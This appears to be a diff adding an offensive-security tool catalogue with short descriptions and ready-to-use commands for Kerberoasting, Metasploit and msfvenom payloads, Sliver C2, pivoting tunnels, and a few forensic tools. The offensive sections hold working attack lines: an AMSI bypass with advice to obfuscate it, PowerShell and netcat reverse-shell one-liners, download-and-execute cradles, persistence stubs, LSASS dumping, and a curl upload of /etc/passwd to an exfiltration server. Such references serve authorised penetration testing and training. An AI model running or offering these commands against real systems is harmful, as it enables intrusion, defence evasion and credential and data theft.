+    • Kerberoast: GetUserSPNs.py corp/user:pass -request -outputfile roast.txt  ->  hashcat -m 13100
+    • AS-REP roast: GetNPUsers.py corp/ -usersfile users -no-pass -format hashcat  ->  hashcat -m 18200
+    • overpass-the-hash: getTGT.py corp/user -hashes :<NT>  ->  export KRB5CCNAME=user.ccache  ->  -k -no-pass on any impacket tool
+    • golden/silver: ticketer.py -nthash <krbtgt|service> -domain-sid <sid> -domain corp.local <user> ; diamond via Rubeus; S4U for constrained delegation
+exploit_linux_suggester          - linux-exploit-suggester - kernel privesc finder
+    linux-exploit-suggester maps a target's kernel and package versions to
+    public local-privesc exploits - DirtyCOW, DirtyPipe, PwnKit, OverlayFS,
+    Looney Tunables - ranked by probability with exploit links, plus a
+    --checksec hardening view. Verify the box has a compiler and the
+    vulnerable package before trusting a hit.
+    • ./linux-exploit-suggester.sh                run on the target; --checksec for hardening state
+    • maps kernel + package versions to public exploits: DirtyCOW, DirtyPipe, PwnKit (pkexec), OverlayFS, nft_object, Looney Tunables
+    • -k 5.10 check a specific version ; --cvelist-file / -f full details ; ranks by probability, gives exploit links
+    • verify the box actually has a compiler / the vuln package before trusting a hit
+exploit_metasploit               - Metasploit console and workflow notes
+    The Metasploit Framework: a searchable database of exploit and auxiliary
+    modules, staged and stageless payloads, the Meterpreter post-exploitation
+    agent, session and pivot management (autoroute, socks_proxy), and a
+    backing database for scan results. Console workflow notes and resource
+    scripts.
+    • search cve:2021 type:exploit platform:windows ; use <path> ; info ; show options ; set RHOSTS/LHOST ; check ; run -j
+    • payloads: windows/x64/meterpreter/reverse_tcp (staged) vs .../reverse_https ; set EXITFUNC thread ; set AutoRunScript
+    • sessions -l / -i <id> ; meterpreter: getuid, getsystem, hashdump, migrate, ps, portfwd, run post/multi/recon/local_exploit_suggester
+    • pivot: run autoroute -s 10.0.0.0/24 ; use auxiliary/server/socks_proxy ; db: workspace, db_nmap, hosts, services, creds ; resource scripts (.rc)
+exploit_msfvenom                 - msfvenom - payload / executable generation
+    msfvenom generates payloads and stagers in any output format - exe, elf,
+    dll, war, PowerShell, raw shellcode, C#, HTA - with LHOST/LPORT baked in,
+    optional bad-char handling, and template injection into a legitimate
+    executable. Note that encoding is no longer AV evasion. The standard
+    payload builder.
+    • msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=you LPORT=443 -f exe -o s.exe   (-f elf/dll/war/psh/raw/python/hta-psh/vbs)
+    • list: --list payloads|formats|encoders ;  --list-options -p <payload>
+    • badchars/encode: -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 5   (encoding is NOT AV evasion any more)
+    • -x calc.exe -k template injection ;  EXITFUNC=thread ;  raw shellcode: -f c / -f csharp for a custom loader
+exploit_powerup                  - PowerUp - Windows privilege-escalation checks
+    PowerUp is a PowerShell privesc-audit script: Invoke-AllChecks finds
+    unquoted service paths, modifiable service binaries and ACLs, service
+    registry ACLs, PATH DLL-hijack directories, AlwaysInstallElevated and
+    modifiable scheduled tasks - and ships the abuse functions to exploit them
+    directly.
+    • . .\PowerUp.ps1 ; Invoke-AllChecks | Format-List        (or Invoke-PrivescAudit in the PowerSploit-maintained branch)
+    • finds: unquoted service paths, modifiable service binaries/ACLs, service registry ACLs, %PATH% DLL hijack, AlwaysInstallElevated, modifiable scheduled tasks
+    • abuse built in: Install-ServiceBinary -Name svc ; Write-ServiceBinary ; Invoke-ServiceAbuse -Name svc -Command '...' ; Add-ServiceDacl
+    • Get-ModifiableServiceFile / Get-UnattendedInstallFile / Get-RegistryAutoLogon for targeted checks
+exploit_rdesktop                 - rdesktop - connect to an RDP service
+    rdesktop is a legacy RDP client with drive and clipboard redirection. It
+    fails against NLA-only servers, so for modern targets, pass-the-hash or
+    Kerberos use xfreerdp instead. Kept for old systems.
+    • rdesktop -u user -p pass -g 1440x900 -r disk:share=/tmp -a 16 <host>
+    • -d domain, -r clipboard:CLIPBOARD, -k en-us ; -0 console session
+    • legacy client - fails against NLA-only servers; prefer xfreerdp for NLA / PtH / Kerberos
+exploit_rdp_check                - check RDP exposure with Metasploit
+    Metasploit auxiliary modules and nmap scripts for assessing RDP before you
+    connect - is NLA required, what security layer, the certificate CN and
+    expiry, and a BlueKeep (CVE-2019-0708) pre-auth RCE check. Validate
+    credentials cheaply first with nxc rdp.
+    • use auxiliary/scanner/rdp/rdp_scanner            NLA required? security layer? cert CN / expiry
+    • use auxiliary/scanner/rdp/cve_2019_0708_bluekeep    BlueKeep pre-auth RCE check (set RHOSTS)
+    • also: nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <host>   (leaks hostname/domain/OS build)
+    • validate creds cheaply first: nxc rdp <host> -u user -p pass   (Pwn3d! = interactive allowed)
+exploit_searchsploit             - searchsploit - offline Exploit-DB search
+    searchsploit is the offline command-line search for Exploit-DB - find
+    exploits by product and version, view or copy the code, and parse an nmap
+    XML to get per-service suggestions. Update the local copy first, and
+    always read the exploit before running it.
+    • searchsploit apache 2.4.49          (-t title only, --exclude='dos|/dos/', -w show URLs, -j JSON)
+    • searchsploit -x <edb-id>            view an exploit ;  -m <edb-id>   copy it to the CWD
+    • searchsploit --nmap scan.xml        parse an nmap -oX and suggest exploits per service
+    • searchsploit -u   update the local copy first; results are a starting point, always read the code
+exploit_sliver                   - Sliver - cross-platform adversary-emulation C2
+    Sliver is a modern cross-platform adversary-emulation C2. Generate an
+    implant over mTLS, HTTP(S) or DNS (or as shellcode), start a matching
+    listener, then use sessions for interactive control or beacons with
+    interval/jitter. Session commands cover execute-assembly, sideload,
+    procdump, screenshots, pivots and socks5; the armory adds BOFs and .NET
+    tooling. A common open-source alternative to Cobalt Strike.
+    • server: sliver-server ; operator: sliver ; generate --mtls you:443 --os windows --save imp.exe   (or --http / --dns, --format shellcode)
+    • http(s) listener: https --lport 443 ; then run the implant ->  sessions ,  use <id>
+    • session cmds: execute-assembly, sideload, getsystem, procdump, screenshot, pivots (named-pipe / tcp), socks5 start, portfwd
+    • armory install <ext> for BOFs / .NET tooling ; beacons (interval/jitter) vs interactive sessions ; multiplayer with multiplayer + new-operator
+exploit_xfreerdp                 - xfreerdp - RDP client with NLA / creds
+    xfreerdp is the full-featured RDP client - NLA, pass-the-hash (/pth),
+    Kerberos, drive/clipboard/printer redirection and RD Gateway support. The
+    default choice for connecting to Windows RDP with credentials or a hash.
+    xfreerdp3 changes some flag syntax.
+    • xfreerdp /v:<host> /u:user /d:corp /p:'Pass' /cert:ignore /dynamic-resolution +clipboard
+    • pass-the-hash: xfreerdp /v:host /u:user /pth:<NThash>        Kerberos: /u:user /d:corp /k  (with a ccache)
+    • redirection: /drive:share,/tmp  /clipboard  /printer  ; /gateway:g:host,u:..,p:.. for RD Gateway
+    • xfreerdp3 syntax adds /sec:nla|tls|rdp ; /size:1440x900 or /w /h ; /log-level:INFO to debug auth
+
+POWERSHELL ####################################################################################
+
+powershell_amsi_bypass           - AMSI / ETW / Constrained-Language-Mode bypass techniques
+    Techniques for disabling the defensive telemetry that blocks offensive
+    PowerShell - patching AmsiScanBuffer in amsi.dll (or the signatured
+    amsiInitFailed reflection trick), patching EtwEventWrite, and escaping
+    Constrained Language Mode via runspace downgrade or InstallUtil. Obfuscate
+    before use and test with the 'AmsiUtils' string.
+    • classic (signatured, mutate it): [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    • memory patch: VirtualProtect AmsiScanBuffer in amsi.dll and write 0xC3 / return AMSI_RESULT_CLEAN
+    • ETW: patch EtwEventWrite in ntdll ; CLM escape via runspace downgrade, InstallUtil, or a custom host
+    • tooling: AMSI.fail / amsi-bypass generators; test with 'AmsiUtils' string; obfuscate (Invoke-Obfuscation) before use
+powershell_nishang               - Nishang / PowerSploit - offensive PowerShell script collections
+    Nishang and PowerSploit are collections of offensive PowerShell scripts -
+    reverse shells, Invoke-Mimikatz, credential and hash grabbers, keyloggers,
+    exfiltration, shellcode and DLL injection, plus PowerView and PowerUp.
+    Load them in memory. Stock copies trip AMSI; use forks, obfuscation, or
+    the C# GhostPack equivalents on modern Windows.
+    • Nishang: Invoke-PowerShellTcp -Reverse -IPAddress you -Port 443 ; also Invoke-PowerShellTcpOneLine, Get-PassHashes, Invoke-Mimikatz, keyloggers, Do-Exfiltration
+    • PowerSploit: Invoke-Mimikatz, Invoke-Shellcode, Invoke-DllInjection, Get-GPPPassword, plus PowerView / PowerUp
+    • load in memory: iex(iwr -useb http://you/Invoke-PowerShellTcp.ps1) ; expect AMSI to flag stock copies - obfuscate / use the -enc form
+    • many modules unmaintained; use forks or the C# equivalents (GhostPack) on modern Windows
+powershell_enum                  - PowerShell enumeration and file-search scripts
+    A set of PowerShell one-liners for host enumeration - local users and
+    groups, processes, services, scheduled tasks, listening sockets and IP
+    config - plus recursive credential hunting through config/xml/ini/script
+    files with Select-String, and ACL checks for weak permissions.
+    • host: whoami /all ; Get-LocalUser ; Get-LocalGroupMember Administrators ; Get-Process ; Get-Service | ? Status -eq Running ; Get-ScheduledTask
+    • creds hunt: Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,unattend.xml -EA 0 | Select-String -Pattern 'password|pwd|secret|apikey'
+    • ACLs: Get-Acl 'C:\path' | fl ; Get-ChildItem -Recurse | Get-Acl | ? {$_.AccessToString -match 'Everyone.*Modify'}
+    • network: Get-NetTCPConnection -State Listen ; Get-NetIPConfiguration ; Get-DnsClientCache
+powershell_exploit               - PowerShell exploitation and post-exploitation
+    PowerShell snippets for exploitation and post-exploitation -
+    download-and-execute cradles, in-memory .NET assembly loading,
+    process/token access stubs, service abuse with sc.exe, and persistence
+    stubs (Run key, WMI event subscription, scheduled task, startup folder) to
+    adapt.
+    • download-exec: iex(New-Object Net.WebClient).DownloadString('http://you/x.ps1')  ;  IWR -UseBasicParsing http://you/x -OutFile $env:TEMP\x
+    • in-memory .NET: [Reflection.Assembly]::Load([Convert]::FromBase64String($b)) ; then [Namespace.Class]::Main(@())
+    • token/process: Get-Process lsass ; injection stubs ; service abuse: sc.exe config svc binPath= "cmd /c ..." ; New-Service
+    • persistence: registry Run key, WMI event subscription, scheduled task, startup folder - stubs to adapt
+powershell_info                  - useful PowerShell commands
+    A general PowerShell reference - command and object discovery
+    (Get-Command, Get-Help, Get-Member), PowerShell Remoting (Enter-PSSession,
+    Invoke-Command), the -enc / -ep bypass execution flags, and WMI/CIM
+    queries for processes and services. The 'how do I do X in PowerShell'
+    sheet.
+    • discovery: Get-Command *keyword* ; Get-Help cmdlet -Examples ; Get-Member (pipe an object to it) ; $PSVersionTable
+    • remoting: Enter-PSSession -ComputerName host -Credential (Get-Credential) ; Invoke-Command -ComputerName h1,h2 -ScriptBlock {hostname}
+    • execution policy is not a security boundary: powershell -ep bypass -nop -w hidden -enc <b64-UTF16LE>
+    • WMI/CIM: Get-CimInstance Win32_Process ; Get-CimInstance Win32_Service -Filter "StartName='LocalSystem'"
+powershell_reverse_shell         - PowerShell reverse-shell staging and listeners
+    PowerShell reverse-shell staging: the raw TCPClient one-liner, how to
+    base64-encode it correctly (UTF-16LE) for -enc, matching listeners (nc,
+    ncat --ssl, Metasploit), and HTTP(S) variants that blend better on
+    egress-filtered networks. Expect AMSI to block the plain one-liner.
+    • one-liner: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('you',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sy=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);$s.Flush()}"
+    • encode it: pwsh -c '[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((gc rs.ps1 -Raw)))'  ->  powershell -enc <b64>
+    • listener: nc -lvnp 443 (then upgrade) ; ncat --ssl -lvnp 443 for TLS ; or metasploit multi/handler windows/powershell_reverse_tcp
+    • HTTP(S) variants (Nishang Invoke-PowerShellUdp / -Https) blend better on egress-filtered nets
+powershell_scripts               - PowerShell remote scripting, enum and shells
+    Recipes for remote PowerShell work at scale - running scripts from memory
+    with no disk write, pulling and pushing files with WebClient /
+    Invoke-WebRequest, and fanning a script out across many hosts with
+    PSSession and Invoke-Command. Includes -enc and AMSI-bypass wrappers for
+    scripts that get flagged.
+    • run from memory, no disk: iex (iwr -useb http://you/enum.ps1) ; IEX ([ScriptBlock]::Create($code))
+    • file pull/push: (New-Object Net.WebClient).DownloadFile('http://you/f','C:\t\f') ; Invoke-WebRequest -Method PUT -InFile loot.zip http://you/up
+    • fan-out: $s = New-PSSession h1,h2,h3 ; Invoke-Command -Session $s -FilePath .\collect.ps1 ; Receive-PSSession
+    • base64/-enc wrappers and AMSI-bypass prepend for the scripts that get flagged
+
+TRANSFER ######################################################################################
+
+transfer_cloudflared             - cloudflared / ngrok - expose a local port via a trusted public domain
+    cloudflared and ngrok expose a local port through a trusted public domain
+    when the target can reach Cloudflare or ngrok edges but not your IP
+    directly (egress filtering, NAT). One command gives an HTTPS URL,
+    outbound-only, no account needed for the quick form; named cloudflared
+    tunnels give a stable hostname.
+    • cloudflared tunnel --url http://localhost:8000       instant *.trycloudflare.com HTTPS, outbound-only, no account
+    • ngrok http 8000   /   ngrok tcp 4444                 public URL + inspection UI on http://127.0.0.1:4040
+    • use when the target can reach Cloudflare / ngrok edges but not your IP directly (egress-filtered, NAT)
+    • named cloudflared tunnels (tunnel create / route dns) for a stable hostname
+transfer_dns_icmp_tunnel         - iodine / dnscat2 / hans / ptunnel-ng - tunnel C2 over DNS or ICMP
+    iodine, dnscat2, hans and ptunnel-ng tunnel a shell or full IP traffic
+    over DNS or ICMP when those are the only protocols that egress a
+    locked-down segment. Slow (DNS especially) and DNS tunnels need a
+    delegated NS record, but often the only way out. dnscat2 is an encrypted
+    shell + file transfer over DNS.
+    • dnscat2: server ->  dnscat2-server tun.you.com    client ->  ./dnscat tun.you.com    (encrypted shell + file xfer over DNS TXT/CNAME)
+    • iodine: server -> iodine -f -P pw 10.0.0.1 tun.you.com   client -> iodine -f -P pw tun.you.com    (full IP-over-DNS tun)
+    • ptunnel-ng -r<you> -R22   /   client  ptunnel-ng -p<you> -l2222 -r127.0.0.1 -R22    IP-over-ICMP echo
+    • slow (DNS especially) but often the only egress from a locked-down segment; needs a delegated NS record for iodine/dnscat
+transfer_frp                     - FRP - fast reverse proxy (TCP/UDP/HTTP tunnels + SOCKS)
+    FRP (Fast Reverse Proxy) multiplexes several TCP/UDP forwards, HTTP/HTTPS
+    vhost routes and a SOCKS pivot over one connection from a target back to
+    your server. A single Go binary per side, with token auth, TLS and a
+    dashboard. Use it when you want multiple stable forwards through one
+    tunnel.
+    • you:  frps -c frps.toml  (bindPort=7000)      target:  frpc -c frpc.toml
+    • frpc.toml proxy: type="tcp" localPort=3389 remotePort=13389   ->  reach it on you:13389
+    • type="socks5" gives a pivot; also http/https vhost routing, stcp/xtcp for P2P, token auth, TLS, web dashboard
+    • single Go binary per side; good when you want several forwards multiplexed over one connection
+transfer_regeorg                 - reGeorg / Neo-reGeorg / rpivot - SOCKS proxy through a webshell
+    reGeorg / Neo-reGeorg / rpivot provide a SOCKS proxy into an internal
+    network through a web shell: drop a tunnel script (php/jsp/aspx) on the
+    compromised web server, run the client locally, and point proxychains at
+    it. Neo-reGeorg encrypts the traffic; rpivot needs no web shell, calling
+    back instead.
+    • drop tunnel.(php|jsp|aspx|ashx) on the target, then:  python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.php
+    • point tools at it: proxychains nxc smb 10.0.0.0/24   (socks4 127.0.0.1 1080 in proxychains.conf)
+    • Neo-reGeorg: python neoreg.py generate -k key ; python neoreg.py -k key -u http://target/tunnel.php   (encrypted / obfuscated - preferred)
+    • rpivot: pure-python, client on target connects back to your server which exposes a local SOCKS - no webshell needed
+transfer_sshuttle                - sshuttle - transparent VPN-style pivot over a plain SSH session
+    sshuttle gives a VPN-like pivot over a plain SSH session: it routes chosen
+    subnets (and optionally DNS) through the SSH host with no special software
+    on the far side - just Python on the pivot and root locally. The quickest
+    'feels like a VPN' option when you have SSH access to an internal box.
+    • sshuttle -r user@pivot 10.0.0.0/24 172.16.0.0/16          route those subnets through the SSH host
+    • --dns also tunnel DNS ; -x 10.0.0.5 exclude ; -N auto-detect remote subnets ; -v verbose
+    • needs Python on the pivot and root locally (iptables), but NO root on the far side
+    • quickest "feels like a VPN" option when you have SSH creds/key to an internal host
+transfer_reverse_ssh             - reverse-ssh / goshs - full-featured reverse shells and file server
+    reverse-ssh and goshs are single static 'one binary, no deps' drops.
+    reverse-ssh gives a full PTY, SCP and port forwarding back through a
+    target that has no sshd; goshs is an HTTP(S) file server with an upload
+    form, WebDAV, auth and an embedded shell. Both for combined file transfer
+    and interactive access.
+    • reverse-ssh: you  ./reverse-ssh -l -p 4444        target  ./reverse-ssh -p 4444 you    ->  then  ssh -p 8888 127.0.0.1  for a full PTY + SCP + -L/-R
+    • single static binary, works when the target has no sshd; -v verbose, -N skip shell (forward-only)
+    • goshs -p 8000 -u -b user:pass          HTTP(S) file server with upload form, WebDAV, auth, shared clipboard, embedded shell (-e)
+    • both are great "one binary, no deps" drops for moving files + interactive access
+transfer_ligolo                  - Ligolo-ng - tunnel / pivot via a userland TUN interface
+    Ligolo-ng pivots into an internal network via a userland TUN interface:
+    run the agent on the target and the proxy locally, add a route to the
+    internal subnet, and reach it natively with no proxychains. A userspace
+    TCP stack makes it fast, and reverse listeners bring callbacks back
+    through the tunnel.
+    • you:  ./proxy -selfcert     target:  ./agent -connect you:11601
+    • in the proxy console:  session  ->  pick agent  ->  ifconfig (see its nets)  ->  start   (or tunnel_start --tun ligolo)
+    • locally:  sudo ip route add 10.0.0.0/24 dev ligolo    then reach the internal net natively - no proxychains
+    • listener back through the tunnel:  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444   ; fast (userspace TCP stack)
+transfer_static_binaries         - static Linux helper binaries to drop on a target
+    A pointer to pre-compiled, statically-linked builds of common tools
+    (busybox, socat, ncat, nmap, tcpdump, python, chisel, ligolo) for dropping
+    on a bare target with no package manager or a mismatched libc. Check the
+    architecture with uname -m / file first.
+    • pre-compiled, statically-linked binaries for when the target is bare / has no package manager or libc match
+    • common set: busybox, socat, ncat, nmap, tcpdump, gdb, python, chisel, ligolo agent, curl, jq
+    • check arch first: uname -m  /  file /bin/ls   ->  grab x86_64 / i686 / aarch64 / armv7 build
+    • sources: GTFOBins-adjacent static repos, andrew-d/static-binaries, ernw/static-toolbox
+transfer_HTTPServer_ngrok        - local HTTP server and ngrok tunnelling
+    The simplest file-transfer setup: serve a directory with python3 -m
+    http.server (or updog for auth and upload), and expose it with ngrok when
+    the target can egress to ngrok but not to your listener. Pull files back
+    with updog, netcat or a curl upload.
+    • serve: python3 -m http.server 8000    (or  updog -p 8000  for auth + upload)
+    • expose: ngrok http 8000   ->  give the target the https URL; inspect requests at 127.0.0.1:4040
+    • pull files back: run  updog  or  nc -lvnp 4444 > loot  ;  target  curl -F f=@loot http://.../  or  wget --post-file
+    • use when the target can egress to ngrok but not to your listener IP
+transfer_add_route               - add static routes for pivoting through a host
+    The manual routing piece for pivoting: add a static route (ip route add /
+    route add) so traffic for an internal subnet goes via a host you control
+    or a ligolo/tun interface, instead of using SOCKS. Includes verification
+    and cleanup commands for Linux and Windows.
+    • Linux:  ip route add 10.0.0.0/24 via 192.168.1.50 dev eth0        (temp; add to netplan/NM for persistence)
+    • Windows:  route add 10.0.0.0 mask 255.255.255.0 192.168.1.50      (route -p for persistent)
+    • verify:  ip route get 10.0.0.5  /  tracepath 10.0.0.5   ; delete with  ip route del ...
+    • the manual routing piece when you control an on-path box (or a ligolo/tun iface) instead of using SOCKS
+transfer_chisel                  - chisel - fast TCP/UDP tunnel over HTTP
+    chisel tunnels TCP/UDP over HTTP, most often as a reverse SOCKS proxy: run
+    the server with --reverse --socks5, connect the client from the target
+    with R:1080:socks, and proxychains through it. Also does single reverse or
+    forward port-forwards, multiplexed over one HTTP connection with optional
+    auth.
+    • you:   chisel server -p 8080 --reverse --socks5
+    • target reverse SOCKS:  chisel client you:8080 R:1080:socks     ->  proxychains through 127.0.0.1:1080
+    • single reverse forward:  chisel client you:8080 R:3389:10.0.0.9:3389   ->  reach it on you:3389
+    • forward mode (you have inbound to target):  chisel client target:8080 2222:127.0.0.1:22 ; --auth user:pass, multiplexed over one HTTP conn
+transfer_moving_files            - cross-platform file-transfer techniques
+    A cross-platform catalogue of file-transfer techniques - Linux
+    curl/wget//dev/tcp/base64-paste, Windows certutil/bitsadmin/PowerShell,
+    impacket-smbserver both directions, and no-tools netcat and FTP-script
+    methods. The reference for 'how do I get this file onto or off this box'.
+    • Linux pull: curl -O http://you/f | wget http://you/f | (exec 3<>/dev/tcp/you/80; ...) ; push: curl -F f=@f http://you/ ; scp; base64 -w0 f  (paste)  then  base64 -d
+    • Windows: certutil -urlcache -split -f http://you/f f.exe ; powershell iwr http://you/f -OutFile f ; (New-Object Net.WebClient).DownloadFile() ; bitsadmin /transfer j http://you/f C:\f
+    • SMB both ways: impacket-smbserver share . -smb2support   then  copy \\you\share\f .   (add -user -password for auth from Win11)
+    • no-tools: nc you 4444 < f  /  nc -lvnp 4444 > f ;  tar cf - dir | nc ... ;  Windows FTP -s:script
+transfer_netcat                  - netcat - file transfer, shells and port checks
+    netcat is the multipurpose TCP/UDP tool: listen or connect, check ports,
+    transfer a file (with a checksum both ends), or run a shell. ncat adds
+    --ssl, --exec, allow-lists and keep-listening. The
+    lowest-common-denominator building block for shells and transfers.
+    • listen: nc -lvnp 4444          connect: nc <host> 4444          port check: nc -zv <host> 20-25
+    • file: receiver  nc -lvnp 4444 > out    sender  nc <host> 4444 < in   (add a checksum: md5sum both ends)
+    • shell: nc -lvnp 4444 -e /bin/bash  (or no -e:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc you 4444 >/tmp/f)
+    • ncat extras: --ssl, --exec, --allow <ip>, -k keep listening, --sh-exec ; banner grab: printf 'HEAD / HTTP/1.0\r\n\r\n' | nc host 80
+transfer_tunnels                 - SSH / socat / chisel port-forwarding and tunnels
+    SSH, socat and chisel port-forwarding patterns - ssh -L local forward, -R
+    remote forward, -D dynamic SOCKS, and -J to chain hops; socat as a simple
+    relay or PTY shell bridge; chisel when SSH is unavailable. The reference
+    for building the forward you need.
+    • ssh -L 9000:10.0.0.9:3389 user@pivot     local:  hit 127.0.0.1:9000 -> pivot -> 10.0.0.9:3389
+    • ssh -R 8000:127.0.0.1:8000 user@you      remote: expose your local 8000 to the pivot
+    • ssh -D 1080 user@pivot                   dynamic SOCKS for proxychains ; chain hops with -J user@box1,user@box2
+    • socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.9:80   simple relay ; add ,pty,stderr for shells ; chisel when SSH is unavailable
+transfer_updog                   - updog - simple HTTP file-upload / download server
+    updog is a small HTTP(S) file server with an upload web form and basic
+    auth - one command to both host payloads and receive exfil, with a
+    searchable directory listing. Push files to it with a curl -F upload.
+    • updog -d /srv/loot -p 8000            serve + accept uploads via a web form at /upload
+    • updog --ssl -a S3cret                 HTTPS (self-signed) + basic auth
+    • one command to host payloads AND receive exfil; directory listing with search
+    • curl push:  curl -F 'file=@/etc/passwd' http://you:8000/upload
+
+
+FORENSIC ######################################################################################
+
+forensic_decompilers             - decompilers - jadx / jd-gui (Java), dnSpy / ILSpy (.NET)
+    Decompilers that recover readable source from compiled apps - jadx and
+    jd-gui for Android/Java, dnSpy and ILSpy for .NET (dnSpy can also edit and
+    live-debug). Grep the output for hard-coded secrets, URLs and
+    license/anti-debug checks. Pair with apktool for Android resources when
+    obfuscation defeats jadx.
+    • jadx -d out app.apk            or  jadx-gui app.apk   - Android DEX / JAR to readable Java, searchable
+    • .NET: dnSpy app.exe (edit + live debug), ILSpy / dotPeek / ilspycmd -p -o out app.dll
+    • grep the output for secrets: strings/URLs, hard-coded keys, IsDebuggerPresent, license checks
+    • pair with apktool d app.apk for resources / smali when jadx fails on obfuscation
+forensic_eztools                 - Eric Zimmerman tools - Amcache / ShimCache / Prefetch parsing
+    Eric Zimmerman's tools parse Windows execution and registry artefacts into
+    CSV - PECmd for Prefetch (what ran, how often, files touched),
+    AmcacheParser and AppCompatCacheParser (ShimCache) for evidence of
+    execution, MFTECmd for the $MFT, plus RECmd, LECmd, JLECmd and SBECmd.
+    Load the CSVs in Timeline Explorer.
+    • PECmd.exe -d C:\Windows\Prefetch --csv out            program execution + run counts + files touched
+    • AmcacheParser.exe -f Amcache.hve --csv out ; AppCompatCacheParser.exe --csv out   (ShimCache)
+    • MFTECmd.exe -f $MFT --csv out ; RECmd (registry batch), LECmd (LNK), JLECmd (jump lists), SBECmd (shellbags)
+    • load the CSVs in Timeline Explorer to sort/filter; RECmd -f SOFTWARE --bn BatchExamples\...
+forensic_networkminer            - NetworkMiner - passive PCAP artefact and credential extraction
+    NetworkMiner is a passive pcap analyser that reconstructs sessions rather
+    than showing raw packets: tabs for hosts (with OS guesses), carved files
+    and images, extracted messages and credentials, and DNS. The fast 'what
+    left the network and what files moved' pass without touching Wireshark.
+    • File > Open a pcap (or set a live interface on the pro version) - it reconstructs sessions, not raw packets
+    • tabs: Hosts (OS guess, ports, banners), Files (carved), Images, Messages (email/chat), Credentials, Parameters, DNS
+    • great for a quick "what left the network" pass and pulling out transferred files without touching Wireshark
+    • CLI companion: NetworkMinerCLI.exe -r cap.pcap -w outdir
+forensic_xplico                  - Xplico - reconstruct application data from captured traffic
+    Xplico reconstructs application-level data from a capture - web pages,
+    emails (IMAP/POP/SMTP), VoIP calls (playable SIP/RTP), chat, DNS, FTP -
+    organised as cases and sessions in a web UI, or batch-processed from the
+    CLI. Another 'what left the network' tool alongside NetworkMiner.
+    • pcap in -> protocols carved out: web pages, emails (IMAP/POP/SMTP), VoIP calls (SIP/RTP, playable), chat, DNS, FTP
+    • web UI on :9876 (default xplico/xplico); organise work as Case -> Session, live interface or uploaded .pcap
+    • batch mode: xplico -m pcap -f capture.pcap  -> xdecode/ tree, no UI
+    • pairs with forensic_networkminer / forensic_tshark for a "what left the network" pass
+forensic_procdump                - Sysinternals ProcDump - process memory capture (LSASS)
+    Sysinternals ProcDump captures a process's memory to a dump file, most
+    notably a full dump of lsass.exe to extract credentials offline with
+    pypykatz. It is heavily flagged when the target is lsass - alternatives
+    include comsvcs.dll MiniDump and nanodump. Also used for genuine crash
+    analysis in WinDbg.
+    • procdump.exe -accepteula -ma lsass.exe lsass.dmp        full dump -> offline: pypykatz lsa minidump lsass.dmp
+    • -ma <pid> by id ; -mm mini ; triggers: -c 90 -s 10 (CPU), -h (hang), -e (unhandled exception), -t (terminate)
+    • heavily flagged when the target is lsass - alternatives: comsvcs.dll MiniDump, nanodump, task-manager dump, SilentProcessExit
+    • for crash analysis, load the .dmp in WinDbg / Visual Studio
+forensic_procmon                 - Sysinternals Process Monitor - live process / file / registry trace
+    Sysinternals Process Monitor traces process, file, registry and network
+    activity live. Reproduce a behaviour, then filter by process, path,
+    operation or result - 'NAME NOT FOUND' on a .dll in a writable path
+    reveals a DLL-hijack; 'ACCESS DENIED' on a config shows what to grant.
+    Save .PML for offline review.
+    • run Procmon, reproduce the behaviour, then Filter (Ctrl-L) by Process Name / Path / Operation / Result
+    • hunt privesc: filter Result = "NAME NOT FOUND" + Path ends .dll  -> writable-path DLL hijack; "ACCESS DENIED" on a config you can grant
+    • Tools > Process Tree for parent/child ; enable the stack tab to see which module made the call
+    • save/load .PML for offline review ; Procmon /BackingFile x.pml /Quiet /Minimized for headless capture
+forensic_regshot                 - Regshot - before/after registry and filesystem snapshot diff
+    Regshot takes a before-and-after snapshot of the registry (and optionally
+    chosen filesystem paths) and diffs them, so you can see exactly which
+    keys, values and files a program or malware sample added or changed. Run
+    it on a revertible VM.
+    • 1st shot -> run the installer / sample -> 2nd shot -> Compare -> HTML/TXT diff of keys, values and files added/changed/deleted
+    • tick "Scan dir1" and add C:\;C:\Users\x\AppData to also diff the filesystem
+    • fast way to find a malware's persistence key, dropped files and config location
+    • use on a snapshot VM you can revert
+forensic_capa                    - capa - identify capabilities in executables
+    capa analyses an executable and reports its capabilities in plain terms -
+    'create reverse shell', 'inject thread', 'encrypt data with RC4', 'persist
+    via run key' - mapped to ATT&CK and MBC. Works on PE, ELF, .NET and
+    shellcode. Run it early in triage to decide whether deeper
+    reverse-engineering is worth it.
+    • capa sample.exe                 (-v verbose evidence, -vv full, --json for tooling)
+    • maps code to ATT&CK / MBC: "create reverse shell", "inject thread", "encrypt data with RC4", "persist via run key"
+    • works on PE / ELF / .NET / shellcode (-f sc32|sc64) ; capa -r rules/ for custom rules
+    • run it early in triage to decide whether deeper RE is worth it
+forensic_cutter                  - Cutter - Rizin-based reverse-engineering GUI
+    Cutter is a free Rizin-based reverse-engineering GUI with a decompiler
+    (Ghidra or jsdec), graph view, hex, strings and xrefs side by side, plus a
+    built-in debugger and a Python/rizin scripting console. Lighter than IDA
+    and snappier than Ghidra for small targets.
+    • open a binary -> auto-analysis -> Disassembly + Decompiler (Ghidra/jsdec) side by side, graph view, hex, strings, xrefs
+    • navigate: G goto, X xrefs, N rename, ; comment ; the built-in debugger (F9 run, F7/F8 step) for dynamic checks
+    • Python/rizin console for scripting ; lighter and free vs IDA, snappier UI than Ghidra for small targets
+forensic_ida_free                - IDA Free 7.6 - interactive x86/x64 disassembler (no decompiler)
+    IDA Free 7.6 is the no-cost tier of the industry-standard interactive
+    disassembler - auto-analysis, cross-references, renaming, FLIRT
